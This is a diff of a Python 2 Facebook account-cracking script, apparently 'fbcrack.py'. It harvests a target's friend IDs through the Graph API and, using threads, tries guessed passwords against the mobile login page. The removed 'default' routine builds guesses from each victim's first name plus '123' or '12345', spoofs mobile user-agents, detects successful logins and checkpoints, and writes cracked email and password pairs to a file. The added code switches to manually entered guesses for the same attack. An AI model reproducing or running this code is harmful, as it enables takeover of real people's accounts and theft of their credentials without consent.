@@ -173,91 +173,11 @@ def public():
 	    exit()
     r = requests.get("https://graph.facebook.com/"+idp+"/friends?access_token="+toket)
     z = json.loads(r.text)
-    mtd = raw_input("\n   [•] Crack With Default/Manual Pass [d/m] : ")
-    if mtd=="":
-        print("   [!] Fill In The Correct")
-        public()
-    elif mtd=="d":
-        default(arg)
-    elif mtd=="m":
-        manual(arg)
-    else:
-        print("   [!] Fill In The Correct")
-        public()
+    for i in z['data']:
+	    id.append(i['id'])
+    print "   [•] Total ID       : "+str(len(id))
         
-    def default(arg):
-                print("   [•] Crack Started...\n")
-		global cekpoint,oks
-		em = arg
-		try:
-			os.mkdir('done')
-		except OSError:
-			pass
-		try:
-			an = requests.get('https://graph.facebook.com/'+em+'/?access_token='+toket)
-			v = json.loads(an.text)
-			pw = v['first_name'].lower()
-			rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw, "login" : "submit"}, headers = { "user-agent" : "Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"})
-			xo = rex.content
-			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '   [OK] '+em+' • '+pw
-				oke = open('done/crack.txt', 'a')
-				oke.write('\n   [OK] '+em+' • '+pw)
-				oke.close()
-				oks.append(em)
-			else :
-				if 'checkpoint' in xo:
-					print '   [CP] '+em+' • '+pw
-					cek = open('done/crack.txt', 'a')
-					cek.write('\n   [CP] '+em+' • '+pw)
-					cek.close()
-					cekpoint.append(em)
-				else:
-					pw2 = v['first_name'].lower()+'123'
-					rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw2, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 7.1.2; AFTMM Build/NS6265; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36"})
-					xo = rex.content
-					if 'mbasic_logout_button' in xo or 'save-device' in xo:
-						print '   [OK] '+em+' • '+pw2
-						oke = open('done/crack.txt', 'a')
-						oke.write('\n   [OK] '+em+' • '+pw2)
-						oke.close()
-						oks.append(em)
-					else:
-						if 'checkpoint' in xo:
-							print '   [CP] '+em+' • '+pw2
-							cek = open('done/crack.txt', 'a')
-							cek.write('\n   [CP] '+em+' • '+pw2)
-							cek.close()
-							cekpoint.append(em)
-						else:
-							pw3 = v['first_name'].lower()+'12345'
-							rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : em, "pass" : pw3, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36"})
-							xo = rex.content
-							if 'mbasic_logout_button' in xo or 'save-device' in xo:
-								print '   [OK] '+em+' • '+pw3
-								oke = open('done/crack.txt', 'a')
-								oke.write('\n   [OK] '+em+' • '+pw3)
-								oke.close()
-								oks.append(em)
-							else:
-								if 'checkpoint' in xo:
-									print '   [CP] '+em+' • '+pw3
-									cek = open('done/crack.txt', 'a')
-									cek.write('\n   [CP] '+em+' • '+pw3)
-									cek.close()
-									cekpoint.append(em)
-        	except:
-			pass
-    p = ThreadPool(20)
-    p.map(main, id)
-    print ("\n   [•] Crack Finished")
-    print "   [•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
-    print ("   [•] File Saved At : done/crack.txt")
-    raw_input("   [ Back ]")
-    os.system("python2 fbcrack.py")
-
-
-    def manual(arg):
+    def main(arg):
                 pm4 = raw_input ("   [•] Pass 1 : ")
                 pm5 = raw_input ("   [•] Pass 2 : ")
                 pm6 = raw_input ("   [•] Pass 3 : ")
